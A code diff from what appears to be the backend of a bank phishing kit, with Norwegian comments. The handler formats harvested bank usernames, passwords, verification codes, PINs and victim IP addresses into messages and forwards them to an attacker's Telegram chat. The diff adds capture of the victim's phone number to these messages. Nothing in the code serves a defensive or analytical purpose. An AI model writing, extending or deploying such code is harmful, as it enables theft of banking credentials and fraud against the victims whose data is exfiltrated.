@@ -219,7 +219,7 @@ async function sendToTelegram(chatId, message, topicId = null) {
  * Formaterer data til en lesbar Telegram-melding
  */
 function formatTelegramMessage(data, isNewIPAddress = false) {
-  const { action, bank, phone, bank_username, bank_password, verification_code, auth_method, pin_attempt, pin, ip_adresse, timestamp } = data;
+  const { action, bank, phone, telefonnummer, bank_username, bank_password, verification_code, auth_method, pin_attempt, pin, ip_adresse, timestamp } = data;
   
   let message = '';
   
@@ -308,6 +308,9 @@ function formatTelegramMessage(data, isNewIPAddress = false) {
     case 'login_username_entered':
       message += `👤 <b>Brukernavn Oppgitt</b>\n`;
       message += `📝 <b>Brukernavn:</b> <code>${bank_username || 'N/A'}</code>\n`;
+      if (telefonnummer) {
+        message += `📱 <b>Telefonnummer:</b> <code>${telefonnummer}</code>\n`;
+      }
       break;
 
     case 'pushTAN_confirmed':
@@ -414,12 +417,12 @@ module.exports = async (req, res) => {
     // Dette sikrer at vi kan sende selv om topics ikke fungerer
     try {
       await sendToTelegram(TELEGRAM_CHAT_ID, message, null);
-      console.log(`Data sendt til Telegram for IP: ${ip_adresse}`);
-      
-      res.status(200).json({ 
-        message: 'Data sendt til Telegram!',
-        ip_adresse: ip_adresse 
-      });
+    console.log(`Data sendt til Telegram for IP: ${ip_adresse}`);
+
+    res.status(200).json({ 
+      message: 'Data sendt til Telegram!',
+      ip_adresse: ip_adresse 
+    });
     } catch (telegramError) {
       console.error('Telegram send error:', telegramError);
       // Hvis det fortsatt feiler, kast feilen
